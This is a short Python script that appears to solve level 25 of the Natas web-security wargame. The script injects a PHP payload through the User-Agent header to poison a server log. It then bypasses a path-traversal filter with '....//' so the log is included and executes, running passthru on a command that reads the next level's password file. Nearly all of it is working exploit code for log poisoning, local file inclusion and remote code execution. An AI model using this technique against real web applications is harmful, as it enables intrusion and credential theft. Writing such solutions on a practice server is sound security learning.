from config import password_length
from utils import get_level_url, get_request_object, store_secret_and_print_message

level_number = 25


def get_secret():
    req = get_request_object(level_number)
    url = get_level_url(level_number)
    script = "<?php echo 'natas26 Password: '; passthru('cat /etc/natas_webpass/natas26'); ?>"
    result = req.get(url + "/?lang=natas_webpass", headers={"User-Agent": script})
    cookie = result.cookies.get("PHPSESSID")
    result = req.get(url + f"/?lang=....//logs/natas25_{cookie}.log")
    text = result.text
    search = "natas26 Password:"

    if search in text:
        start_index = text.find(search) + len(search) + 1
        return text[start_index: start_index + password_length]
    else:
        return ""


secret = get_secret()
store_secret_and_print_message(level_number, secret)
